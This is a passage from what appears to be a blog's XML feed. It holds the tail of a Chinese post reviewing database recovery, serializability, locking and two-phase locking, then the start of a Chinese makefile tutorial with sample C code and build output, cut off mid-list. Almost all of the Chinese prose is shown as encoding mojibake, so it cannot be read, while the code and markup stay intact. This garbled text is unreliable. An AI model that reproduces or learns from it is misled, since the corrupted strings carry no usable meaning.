title="Êï∞ÊçÆÂ∫ìÊÅ¢Â§çÂéüÁêÜÂíåÊäÄÊúØ"></a>Êï∞ÊçÆÂ∫ìÊÅ¢Â§çÂéüÁêÜÂíåÊäÄÊúØ</h3><p><strong>Êï∞ÊçÆËΩ¨ÂÇ®</strong>ÔºöËΩ¨ÂÇ®Âç≥DBAÂÆöÊúüÂú∞Â∞ÜÊï¥‰∏™Êï∞ÊçÆÂ∫ìÂ§çÂà∂Âà∞Á£ÅÂ∏¶ÊàñÂè¶‰∏Ä‰∏™Á£ÅÁõò‰∏ä‰øùÂ≠òËµ∑Êù•ÁöÑËøáÁ®ã„ÄÇËøô‰∫õÂ§áÁî®ÁöÑÊï∞ÊçÆÁß∞‰∏∫ÂêéË¢´ÂâØÊú¨„ÄÇ</p><p>ËΩ¨ÂÇ®ÂèàÂàÜ‰∏∫ÈùôÊÄÅËΩ¨ÂÇ®ÂíåÂä®ÊÄÅËΩ¨ÂÇ®ÔºöÈùôÊÄÅËΩ¨ÂÇ®ÂøÖÈ°ªÁ≠âÂæÖÊ≠£Âú®ËøêË°åÁöÑÁî®Êà∑‰∫ãÂä°ÁªìÊùüÊâçËÉΩËøõË°åÔºõÂä®ÊÄÅËΩ¨ÂÇ®ÊòØÊåáËΩ¨ÂÇ®ÊúüÈó¥ÂÖÅËÆ∏ÂØπÊï∞ÊçÆÂ∫ìËøõË°åÂ≠òÂèñÊàñ‰øÆÊîπÔºåÂç≥ËΩ¨ÂÇ®ÂíåÁî®Êà∑‰∫ãÂä°ÂèØ‰ª•Âπ∂ÂèëÊâßË°å„ÄÇ</p><p>‰πüÂèØÂàÜ‰∏∫Êµ∑ÈáèËΩ¨ÂÇ®ÂíåÂ¢ûÈáèËΩ¨ÂÇ®ÔºöÊµ∑ÈáèËΩ¨ÂÇ®Âç≥ÊØèÊ¨°ËΩ¨ÂÇ®ÂÖ®ÈÉ®Êï∞ÊçÆÂ∫ìÔºåÂ¢ûÈáèËΩ¨ÂÇ®Âç≥ÊØèÊ¨°Âè™ËΩ¨ÂÇ®‰∏ä‰∏ÄÊ¨°ËΩ¨ÂÇ®ÂêéÊõ¥Êñ∞ÁöÑÊï∞ÊçÆ„ÄÇ</p><p><strong>ÁôªËÆ∞Êó•ÂøóÔºö</strong>Êó•ÂøóÊñá‰ª∂ÊòØÁî®Êù•ËÆ∞ÂΩï‰∫ãÂä°ÂØπÊï∞ÊçÆÂ∫ìÁöÑÊõ¥Êñ∞Êìç‰ΩúÁöÑÊñá‰ª∂„ÄÇ‰∏çÂêåÊï∞ÊçÆÂ∫ìÁ≥ªÁªüÈááÁî®ÁöÑÊó•ÂøóÊñá‰ª∂Ê†ºÂºèÂπ∂‰∏çÂÆåÂÖ®‰∏ÄÊ†∑Ôºå‰∏ªË¶ÅÊúâ‰∏§ÁßçÊ†ºÂºèÔºö<strong>‰ª•ËÆ∞ÂΩï‰∏∫Âçï‰ΩçÁöÑÊó•ÂøóÊñá‰ª∂</strong>Âíå<strong>‰ª•Êï∞ÊçÆÂùó‰∏∫Âçï‰ΩçÁöÑÊó•ÂøóÊñá‰ª∂</strong></p><p>ÊØè‰∏™Êó•ÂøóËÆ∞ÂΩïÁöÑÂÜÖÂÆπ‰∏ªË¶ÅÂåÖÊã¨Ôºö</p><ul><li>‰∫ãÂä°Ê†áËØÜÔºàÊ†áÊòéÊòØÂì™‰∏™‰∫ãÂä°Ôºâ</li><li>Êìç‰ΩúÁöÑÁ±ªÂûãÔºàÊèíÂÖ•„ÄÅÂà†Èô§Êàñ‰øÆÊîπÔºâ</li><li>Êìç‰ΩúÂØπË±°ÔºàËÆ∞ÂΩïÂÜÖÈÉ®Ê†áËØÜÔºâ</li><li>Êõ¥Êñ∞ÂâçÊï∞ÊçÆÁöÑÊóßÂÄºÔºàÂØπÊèíÂÖ•Êìç‰ΩúËÄåË®ÄÔºåÊ≠§È°π‰∏∫Á©∫ÂÄºÔºâ</li><li>Êõ¥Êñ∞ÂêéÊï∞ÊçÆÁöÑÊñ∞ÂÄºÔºàÂØπÂà†Èô§Êìç‰ΩúËÄåË®ÄÔºåÊ≠§È°π‰∏∫Á©∫ÂÄºÔºâ</li></ul><h3 id="Êï∞ÊçÆÂ∫ìÊïÖÈöúÊÅ¢Â§ç"><a href="#Êï∞ÊçÆÂ∫ìÊïÖÈöúÊÅ¢Â§ç" class="headerlink" title="Êï∞ÊçÆÂ∫ìÊïÖÈöúÊÅ¢Â§ç"></a>Êï∞ÊçÆÂ∫ìÊïÖÈöúÊÅ¢Â§ç</h3><p><strong>‰∫ãÂä°ÂÜÖÈÉ®ÊïÖÈöú</strong>ÁöÑÊÅ¢Â§çÊ≠•È™§Ôºö</p><ol><li>‚ë†ÂèçÂêëÊâ´ÊèèÊó•ÂøóÊñá‰ª∂ÔºåÊü•ÊâæËØ•‰∫ãÂä°ÁöÑÊõ¥Êñ∞Êìç‰Ωú</li><li>Â¶ÇÊûúÈÅáÂà∞update Êìç‰ΩúÔºåÂàôÁî®Êó•ÂøóËÆ∞ÂΩï‰∏≠ÁöÑ‚ÄúÂâçÂÉè‚ÄùÊõ¥Êñ∞Êï∞ÊçÆÂØπË±°;</li><li>Â¶ÇÊûúÈÅáÂà∞insert Êìç‰ΩúÔºåÂàôÂÅödeleteÊìç‰ΩúÔºåÂà†Èô§ËØ•Êï∞ÊçÆÂØπË±°;</li><li>Â¶ÇÊûúÈÅáÂà∞delete Êìç‰ΩúÔºåÂàôÂÅöinsertÊìç‰Ωú,ÊèíÂÖ•‰πãÂâçÂà†ÊéâÁöÑÊï∞ÊçÆÂØπË±°ÔºåÊèíÂÖ•ÁöÑÂÄºÊòØÊó•ÂøóËÆ∞ÂΩï‰∏≠ÁöÑ‚ÄúÂâçÂÉè‚Äù</li><li>‚ë°ÁªßÁª≠ÂèçÂêëÊâ´ÊèèÊó•ÂøóÊñá‰ª∂ÔºåÂØπÊØè‰∏™Êõ¥Êñ∞Êìç‰ΩúËøõË°åÂêåÊ†∑ÁöÑÂ§ÑÁêÜ„ÄÇÁõ¥Âà∞ÈÅáËßÅËØ•‰∫ãÂä°ÁöÑstartËÆ∞ÂΩï‰∏∫Ê≠¢„ÄÇ</li></ol><p><strong>Á≥ªÁªüÊïÖÈöúÁöÑÊÅ¢Â§ç</strong>Ôºö</p><ol><li>‰ªéÂ§¥Êâ´ÊèèÊó•ÂøóÊñá‰ª∂ÔºåÂØπÂÖ∑ÊúâstartÂíåcommitÁöÑËøõË°åREDOÔºåÂØπÂè™Êúâstart‰ΩÜÊó†commitÔºåËøõË°åUNDOÈòüÂàó„ÄÇ</li><li>ÂØπREDOÈòüÂàóËøõË°åREDOÔºåÊ≠£ÂêëÊâ´ÊèèÂπ∂ÊâßË°å„ÄÇ</li><li>ÂØπUNDOÈòüÂàóËøõË°åUNDOÔºåÂèçÂêëÊâ´ÊèèÂπ∂ÊâßË°åÈÄÜÊìç‰Ωú„ÄÇ</li></ol><p><strong>‰ªãË¥®ÊïÖÈöúÁöÑÊÅ¢Â§çÔºö</strong></p><p>DBAÂà©Áî®Êï∞ÊçÆÂ∫ìÂâØÊú¨ÂíåÊó•ÂøóÊñá‰ª∂ÂâØÊú¨ËøõË°åÊÅ¢Â§ç </p><h2 id="6-3-Êï∞ÊçÆÂ∫ìÂπ∂Âèë"><a href="#6-3-Êï∞ÊçÆÂ∫ìÂπ∂Âèë" class="headerlink" title="6.3 Êï∞ÊçÆÂ∫ìÂπ∂Âèë"></a>6.3 Êï∞ÊçÆÂ∫ìÂπ∂Âèë</h2><h3 id="Â§ö‰∫ãÂä°Âπ∂ÂèëÊâßË°åÂÜ≤Á™Å"><a href="#Â§ö‰∫ãÂä°Âπ∂ÂèëÊâßË°åÂÜ≤Á™Å" class="headerlink" title="Â§ö‰∫ãÂä°Âπ∂ÂèëÊâßË°åÂÜ≤Á™Å"></a>Â§ö‰∫ãÂä°Âπ∂ÂèëÊâßË°åÂÜ≤Á™Å</h3><p><strong>Êù°‰ª∂Ôºö</strong></p><ol><li>‰∏§‰∏™Êìç‰ΩúÊù•Ëá™‰∏çÂêåÁöÑ‰∫ãÂä°</li><li>‰∏§‰∏™Êìç‰ΩúÈíàÂØπÂêå‰∏Ä‰∏™ÂØπË±°</li><li>‰∏§‰∏™Êìç‰ΩúÂÖ∂‰∏≠Ëá≥Â∞ëÊúâ‰∏Ä‰∏™ÂÜôÊìç‰Ωú</li></ol><p><strong>ÂÜ≤Á™ÅÂàÜÁ±ªÔºö</strong></p><ol><li>ÂÜô-ÂÜôÔºà‰∏¢Â§±‰øÆÊîπÔºâ</li><li>ÂÜô-ËØªÔºàËØªËÑèÊï∞ÊçÆÔºâ</li><li>ËØª-ÂÜôÔºà‰∏çÂèØÈáçÂ§çËØªÔºâ</li></ol><h2 id="6-4-Âπ∂ÂèëË∞ÉÂ∫¶ÂíåÂèØ‰∏≤Ë°åÂåñ"><a href="#6-4-Âπ∂ÂèëË∞ÉÂ∫¶ÂíåÂèØ‰∏≤Ë°åÂåñ" class="headerlink" title="6.4 Âπ∂ÂèëË∞ÉÂ∫¶ÂíåÂèØ‰∏≤Ë°åÂåñ"></a>6.4 Âπ∂ÂèëË∞ÉÂ∫¶ÂíåÂèØ‰∏≤Ë°åÂåñ</h2><h3 id="‰∫ãÂä°ÁÆÄÂåñ"><a href="#‰∫ãÂä°ÁÆÄÂåñ" class="headerlink" title="‰∫ãÂä°ÁÆÄÂåñ"></a>‰∫ãÂä°ÁÆÄÂåñ</h3><p><strong>‰ª£Êï∞Ë°®Á§∫</strong>ÔºöRi(X)Ë°®Á§∫‰∫ãÂä°TiÁöÑËØªXÊìç‰ΩúÔºåWi(X)Ë°®Á§∫‰∫ãÂä°TiÁöÑÂÜôXÊìç‰Ωú </p><p><strong>‰∏≤Ë°å/Âπ∂ÂèëË∞ÉÂ∫¶</strong>Ôºö‰∏≤Ë°åË∞ÉÂ∫¶‰∫ãÂä°ÊâßË°åÁöÑÁªìÊûúÊÄªÊòØÊ≠£Á°ÆÁöÑÔºå‰ΩÜÊòØ‰∏çËÉΩÂ§üÂÖÖÂàÜÂà©Áî®Á≥ªÁªüËµÑ </p><p>Ê∫ê„ÄÇÂπ∂ÂèëË∞ÉÂ∫¶ÂêÑ‰∏™‰∫ãÂä°‰∫§ÂèâÂú∞ÊâßË°åÔºå‰ΩÜÊòØ‰∏ç‰∏ÄÂÆöÊ≠£Á°Æ„ÄÇ </p><h3 id="Ë∞ÉÂ∫¶ÁöÑÂèØ‰∏≤Ë°åÂåñ"><a href="#Ë∞ÉÂ∫¶ÁöÑÂèØ‰∏≤Ë°åÂåñ" class="headerlink" title="Ë∞ÉÂ∫¶ÁöÑÂèØ‰∏≤Ë°åÂåñ"></a>Ë∞ÉÂ∫¶ÁöÑÂèØ‰∏≤Ë°åÂåñ</h3><p>‰∏Ä‰∏™‰∫ãÂä°ÈõÜÁöÑÂπ∂ÂèëË∞ÉÂ∫¶‰∏éÊüê‰∏Ä‰∏≤Ë°åË∞ÉÂ∫¶ÊòØÁ≠â‰ª∑ÁöÑÔºåÂèØ‰∏≤Ë°åÂåñÊòØ‰Ωú‰∏∫Âπ∂ÂèëË∞ÉÂ∫¶Ê≠£Á°Æ‰∏éÂê¶ÁöÑÂà§ÂÆöÂáÜÂàô </p><h3 id="ÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñ"><a href="#ÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñ" class="headerlink" title="ÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñ"></a>ÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñ</h3><p>‰∏Ä‰∏™Ë∞ÉÂ∫¶ScÂú®‰øùËØÅÂÜ≤Á™ÅÊìç‰ΩúÁöÑÊ¨°Â∫è‰∏çÂèòÊÉÖÂÜµ‰∏ãÔºåÈÄöËøá‰∫§Êç¢‰∏§‰∏™‰∫ãÂä°‰∏çÂÜ≤Á™ÅÊìç‰ΩúÁöÑÊ¨°Â∫èÂæóÂà∞Âè¶‰∏Ä‰∏™Ë∞ÉÂ∫¶Sc‚ÄôÔºå Â¶ÇÊûúSc‚ÄôÊòØ‰∏≤Ë°åÁöÑÔºåÁß∞Ë∞ÉÂ∫¶Sc‰∏∫ÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñË∞ÉÂ∫¶„ÄÇ</p><p><strong>ÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñ‰∏ÄÂÆöÊòØÂèØ‰∏≤Ë°åÂåñÁöÑÔºå‰ΩÜÂèØ‰∏≤Ë°åÂåñ‰∏ç‰∏ÄÂÆöÊòØÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñ</strong></p><h3 id="ÂâçÈ©±ÂõæÔºàÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñÁöÑÂà§ÂÆöÊñπÊ≥ïÔºâÔºö"><a href="#ÂâçÈ©±ÂõæÔºàÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñÁöÑÂà§ÂÆöÊñπÊ≥ïÔºâÔºö" class="headerlink" title="ÂâçÈ©±ÂõæÔºàÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñÁöÑÂà§ÂÆöÊñπÊ≥ïÔºâÔºö"></a>ÂâçÈ©±Âõæ<strong>ÔºàÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñÁöÑÂà§ÂÆöÊñπÊ≥ïÔºâ</strong>Ôºö</h3><p>VÊòØÁî±ÊâÄÊúâÂèÇÂä†Ë∞ÉÂ∫¶ÁöÑ‰∫ãÂä°ÊûÑÊàêÁöÑËäÇÁÇπÔºåEÊòØÂõæ‰∏≠ÁöÑ‰∏ÄÊù°ÊúâÂêëËæπÔºåÂ¶ÇÊûúOiÂíåOjÊòØÂÜ≤Á™ÅÊìç‰ΩúÔºå‰∏îOiÂÖà‰∫éOjÊâßË°åÔºåÂàôÂú®Âõæ‰∏≠Êúâ‰∏ÄÊù°ËæπTi‚ÜíTjÔºåÂ¶ÇÊûúÂæóÂà∞Êó†ÁéØÁöÑÂâçË∂ãÂõæÔºåÂàôÊòØÂèØ‰∏≤Ë°åÂåñÁöÑ „ÄÇ</p><h3 id="ÊãìÊâëÂõæÔºàËé∑ÂæóË∞ÉÂ∫¶SÁöÑ‰∏Ä‰∏™Á≠â‰ª∑ÁöÑ‰∏≤Ë°åË∞ÉÂ∫¶ÔºâÔºö"><a href="#ÊãìÊâëÂõæÔºàËé∑ÂæóË∞ÉÂ∫¶SÁöÑ‰∏Ä‰∏™Á≠â‰ª∑ÁöÑ‰∏≤Ë°åË∞ÉÂ∫¶ÔºâÔºö" class="headerlink" title="ÊãìÊâëÂõæÔºàËé∑ÂæóË∞ÉÂ∫¶SÁöÑ‰∏Ä‰∏™Á≠â‰ª∑ÁöÑ‰∏≤Ë°åË∞ÉÂ∫¶ÔºâÔºö"></a>ÊãìÊâëÂõæÔºàËé∑ÂæóË∞ÉÂ∫¶SÁöÑ‰∏Ä‰∏™Á≠â‰ª∑ÁöÑ‰∏≤Ë°åË∞ÉÂ∫¶ÔºâÔºö</h3><p>Êï∞ÊçÆÁªìÊûÑÔºåÂéªÁ∫øÊ≥ïÔºàËæìÂá∫‰∏Ä‰∏™ÂÖ•Â∫¶‰∏∫0ÁöÑÈ°∂ÁÇπÔºåÁÑ∂ÂêéÂà†Èô§Ê≠§È°∂ÁÇπÔºåÂπ∂Âà†Èô§‰ª•Ê¨°È°∂ÁÇπ‰∏∫Â∞æÁöÑÂºßÔºâ „ÄÇ</p><h2 id="6-5-‰∫ãÂä°ÁöÑÈöîÁ¶ªÊÄß„ÄÅÂ∞ÅÈîÅÂíåÂπ∂ÂèëÊéßÂà∂"><a href="#6-5-‰∫ãÂä°ÁöÑÈöîÁ¶ªÊÄß„ÄÅÂ∞ÅÈîÅÂíåÂπ∂ÂèëÊéßÂà∂" class="headerlink" title="6.5  ‰∫ãÂä°ÁöÑÈöîÁ¶ªÊÄß„ÄÅÂ∞ÅÈîÅÂíåÂπ∂ÂèëÊéßÂà∂"></a>6.5  ‰∫ãÂä°ÁöÑÈöîÁ¶ªÊÄß„ÄÅÂ∞ÅÈîÅÂíåÂπ∂ÂèëÊéßÂà∂</h2><h3 id="Â∞ÅÈîÅ"><a href="#Â∞ÅÈîÅ" class="headerlink" title="Â∞ÅÈîÅ"></a>Â∞ÅÈîÅ</h3><p>Êåá‰∫ãÂä°Âú®ÂØπÊï∞ÊçÆÂØπË±°ËøõË°åÊìç‰Ωú‰πãÂâçÔºåÂøÖÈ°ªÂÖàÂêëÁ≥ªÁªüÁî≥ËØ∑ÂØπÊï∞ÊçÆÂØπË±°Âä†ÈîÅÔºåËé∑ÂæóÂä†ÈîÅ‰πãÂêéÊâçËÉΩËøõË°åÁõ∏Â∫îÁöÑÊìç‰Ωú„ÄÇ</p><h3 id="ÊéíÂÆÉÈîÅÔºàXÈîÅÔºâ"><a href="#ÊéíÂÆÉÈîÅÔºàXÈîÅÔºâ" class="headerlink" title="ÊéíÂÆÉÈîÅÔºàXÈîÅÔºâ"></a>ÊéíÂÆÉÈîÅÔºàXÈîÅÔºâ</h3><p>Ëã•‰∫ãÂä°TÂØπÊï∞ÊçÆÂØπË±°AÂä†‰∏äÊéíÂÆÉÈîÅÔºåÂàôÂè™ÂÖÅËÆ∏TËØªÂèñÂíå‰øÆÊîπAÔºå‰∏çÂÖÅËÆ∏ÂÖ∂‰ªñ‰ªª‰Ωï‰∫ãÂä°ÂÜçÂØπAÂä†‰ªª‰ΩïÈîÅÔºåÁõ¥Âà∞TÈáäÊîæA‰∏äÁöÑXÈîÅ„ÄÇ</p><h3 id="ÂÖ±‰∫´ÈîÅÔºàSÈîÅÔºâ"><a href="#ÂÖ±‰∫´ÈîÅÔºàSÈîÅÔºâ" class="headerlink" title="ÂÖ±‰∫´ÈîÅÔºàSÈîÅÔºâ"></a>ÂÖ±‰∫´ÈîÅÔºàSÈîÅÔºâ</h3><p>Ëã•‰∫ãÂä°TÂØπÊï∞ÊçÆÂØπË±°AÂä†‰∏äÂÖ±‰∫´ÈîÅÔºåÂàô‰∫ãÂä°TÂèØ‰ª•ËØªA‰ΩÜ‰∏çËÉΩ‰øÆÊîπAÔºåÂÖ∂‰ªñ‰∫ãÂä°Âè™ËÉΩÂØπAÂä†SÈîÅÔºåËÄå‰∏çËÉΩÂä†XÈîÅÔºåÁõ¥Âà∞TÈáäÊîæA‰∏äÁöÑSÈîÅ </p><div class="table-container"><table><thead><tr><th>Á∫ßÂà´</th><th>Âä†ÈîÅÂçèËÆÆ</th><th>ÊîæÈîÅ</th></tr></thead><tbody><tr><td>‰∏ÄÁ∫ß</td><td>‰øÆÊîπÊï∞ÊçÆA‰πãÂâçÂøÖÈ°ªÂØπÂÖ∂Âä†XÈîÅ</td><td>‰∫ãÂä°ÁªìÊùüÈáäÊîæXÈîÅ</td></tr><tr><td>‰∫åÁ∫ß</td><td>‰∏ÄÁ∫ß+‰∫ãÂä°TÂú®ËØªÂèñÊï∞ÊçÆA‰πãÂâçÂøÖÈ°ªÂØπÂÖ∂Âä†SÈîÅ</td><td>ËØªÂÆåÈáäÊîæSÈîÅ</td></tr><tr><td>‰∏âÁ∫ß</td><td>‰∏ÄÁ∫ß+‰∫ãÂä°TÂú®ËØªÂèñÊï∞ÊçÆA‰πãÂâçÂøÖÈ°ªÂØπÂÖ∂Âä†SÈîÅ</td><td>‰∫ãÂä°ÁªìÊùüÈáäÊîæSÈîÅ</td></tr></tbody></table></div><p><img src="/2021/05/03/Database-review/image-20210508143748136.png" alt="image-20210508143748136"></p><p><strong>‰∏§ÊÆµÈîÅÂçèËÆÆÔºà2PLÔºâ</strong>ÔºöÊüê‰∏Ä‰∫ãÂä°Âú®ÂØπÊï∞ÊçÆËøõË°åËØª„ÄÅÂÜô‰πãÂâçÔºåÂÖàË¶ÅÁî≥ËØ∑Âπ∂Ëé∑ÂæóÂØπËØ•Êï∞ÊçÆÁöÑÂ∞ÅÈîÅ„ÄÇÂú®ÈáäÊîæ‰∏Ä‰∏™Â∞ÅÈîÅ‰πãÂêéÔºå‰∫ãÂä°‰∏çÂÜçÁî≥ËØ∑ÂíåËé∑Âæó‰ªª‰ΩïÂÖ∂ÂÆÉÂ∞ÅÈîÅ„ÄÇ‰ªª‰Ωï‰∏Ä‰∏™ÈÅµ‰ªé2PLÂçèËÆÆÁöÑË∞ÉÂ∫¶ÈÉΩÊòØÂÜ≤Á™ÅÂèØ‰∏≤Ë°åÂåñÁöÑÔºàÂÖÖÂàÜ‰∏çÂøÖË¶ÅÊù°‰ª∂Ôºâ„ÄÇ</p><p>ÂàÜ‰∏∫‰∏§‰∏™Èò∂ÊÆµÔºö</p><ol><li>Âä†ÈîÅÊÆµ</li><li>Ëß£ÈîÅÊÆµ</li></ol><p>Ê≠ªÈîÅÔºö‰∏§‰∏™Âèä‰ª•‰∏ä‰∫ãÂä°Áõ∏‰∫íÁ≠âÂæÖÈáäÊîæÈîÅÔºåÂà©Áî®Ë∂ÖÊó∂Ê≥ïÊàñÁ≠âÂæÖÂõæÂèëËøõË°åÊ≠ªÈîÅÊ£ÄÊµã„ÄÇ</p><p> Ê¥ªÈîÅÔºöÊüêËµÑÊ∫êÈïøÊúüË¢´‰∏Ä‰∫õ‰∫ãÂä°Â∞ÅÈîÅÔºåÂÖ∂‰ªñ‰∫ãÂä°Âæó‰∏çÂà∞ËØ•ËµÑÊ∫êÔºåÂèØÈááÁî®ÂÖàÊù•ÂÖàÊúçÂä°ÂéüÂàôÈÅøÂÖçÊ¥ªÈîÅ„ÄÇ</p><h2 id="6-6-Êï∞ÊçÆÂ∫ìÂÆåÂÖ®ÊÄß‰∏éÂÆåÊï¥ÊÄß"><a href="#6-6-Êï∞ÊçÆÂ∫ìÂÆåÂÖ®ÊÄß‰∏éÂÆåÊï¥ÊÄß" class="headerlink" title="6.6 Êï∞ÊçÆÂ∫ìÂÆåÂÖ®ÊÄß‰∏éÂÆåÊï¥ÊÄß"></a>6.6 Êï∞ÊçÆÂ∫ìÂÆåÂÖ®ÊÄß‰∏éÂÆåÊï¥ÊÄß</h2><h3 id="Êï∞ÊçÆÂ∫ìÂÆåÂÖ®ÊÄßÊéßÂà∂"><a href="#Êï∞ÊçÆÂ∫ìÂÆåÂÖ®ÊÄßÊéßÂà∂" class="headerlink" title="Êï∞ÊçÆÂ∫ìÂÆåÂÖ®ÊÄßÊéßÂà∂"></a>Êï∞ÊçÆÂ∫ìÂÆåÂÖ®ÊÄßÊéßÂà∂</h3><ol><li>Áî®Êà∑Ê†áËØÜÂíåÈâ¥Âà´</li><li>Â≠òÂèñÊéßÂà∂</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Â§ç‰π†&lt;/p&gt;</summary>
    
    
    
    
    <category term="Course" scheme="https://pz1o.top/tags/Course/"/>
    
  </entry>
  
  <entry>
    <title>makefile</title>
    <link href="https://pz1o.top/2021/04/30/makefile/"/>
    <id>https://pz1o.top/2021/04/30/makefile/</id>
    <published>2021-04-30T09:13:37.000Z</published>
    <updated>2021-06-09T11:47:13.169Z</updated>
    
    <content type="html"><![CDATA[<p>ÊáíÁãóÂøÖÂ§áÔºåmakefile</p><a id="more"></a><p>‰∏∫‰ªÄ‰πàË¶ÅÂÜômakefileÔºåÂõ†‰∏∫Êáí</p><h1 id="0x01-ÁÆÄÂçïmakefileÁºñÂÜô"><a href="#0x01-ÁÆÄÂçïmakefileÁºñÂÜô" class="headerlink" title="0x01 ÁÆÄÂçïmakefileÁºñÂÜô"></a>0x01 ÁÆÄÂçïmakefileÁºñÂÜô</h1><p><strong>makefileÁöÑÂü∫Êú¨Ê†ºÂºè</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target : dependency_files ##dependency_filesÊòØ‰æùËµñÁöÑÊñá‰ª∂</span><br><span class="line">command #Ê≥®ÊÑèÊòØ‰∏Ä‰∏™TAB</span><br><span class="line">hello.o:hello.c hello.h</span><br><span class="line">gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><p>egÔºö</p><p>ËøôÈáåÊúâÂõõ‰∏™Êñá‰ª∂ <code>demo1.c</code> <code>demo2.c</code> <code>main.c</code> <code>head.h</code>Âõõ‰∏™Êñá‰ª∂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is demo1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//demo2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is demo2"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//head.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"head.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    print1();</span><br><span class="line">    print2();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"it is end"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//makefile</span></span><br><span class="line">demo:demo1.o demo2.o main.o</span><br><span class="line">    gcc demo1.o demo2.o main.o -o demo</span><br><span class="line">demo1.o:demo1.c</span><br><span class="line">    gcc demo1.c -Wall -c -o demo1.o</span><br><span class="line">demo2.o:demo2.c</span><br><span class="line">    gcc demo2.c -Wall -c -o demo2.o</span><br><span class="line">main.o:main.c</span><br><span class="line">   gcc main.c -Wall -c -o main.o</span><br><span class="line">clean:</span><br><span class="line">rm *.o demo</span><br><span class="line">        </span><br><span class="line">[<span class="number">17</span>:<span class="number">34</span>:<span class="number">25</span>] pz1o:make_demo $ make      </span><br><span class="line">gcc demo1.c -Wall -c -o demo1.o</span><br><span class="line">gcc demo2.c -Wall -c -o demo2.o</span><br><span class="line">gcc main.c -Wall -c -o main.o</span><br><span class="line">gcc demo1.o demo2.o main.o -o demo</span><br><span class="line">[<span class="number">17</span>:<span class="number">34</span>:<span class="number">28</span>] pz1o:make_demo $ ./demo </span><br><span class="line"><span class="keyword">this</span> is demo1</span><br><span class="line"><span class="keyword">this</span> is demo2</span><br><span class="line">it is <span class="built_in">end</span>%</span><br></pre></td></tr></table></figure><h1 id="0x02-ÂèòÈáè"><a href="#0x02-ÂèòÈáè" class="headerlink" title="0x02 ÂèòÈáè"></a>0x02 ÂèòÈáè</h1><p>ÂèòÈáèÁöÑÂëΩÂêçÂ≠óÂèØ‰ª•ÂåÖÂê´Â≠óÁ¨¶„ÄÅÊï∞Â≠óÔºå‰∏ãÂàíÁ∫øÔºàÂèØ‰ª•ÊòØÊï∞Â≠óÂºÄÂ§¥ÔºâÔºå‰ΩÜ‰∏çÂ∫îËØ•Âê´Êúâ‚Äú:‚Äù„ÄÅ‚Äú#‚Äù„ÄÅ‚Äú=‚ÄùÊàñÊòØÁ©∫Â≠óÁ¨¶ÔºàÁ©∫Ê†º„ÄÅÂõûËΩ¶Á≠âÔºâ„ÄÇÂèòÈáèÊòØÂå∫ÂàÜËã±ÊñáÂ≠óÊØçÂ§ßÂ∞èÂÜôÁöÑ„ÄÇ</p><p>È¢ÑÂÆö‰πâÂèòÈáè</p><ul><li>AR    Â∫ìÊñá‰ª∂Áª¥Êä§Á®ãÂ∫èÂêçÁß∞ÔºåÈªòËÆ§‰∏∫ar.ASÊ±áÁºñÁ®ãÂ∫èÂêçÁß∞ÔºåÈªòËÆ§ÂÄº‰∏∫as„ÄÇ</li><li>CC    CÁºñËØëÂô®ÁöÑÂêçÁß∞ÔºåÈªòËÆ§‰∏∫cc„ÄÇCPP 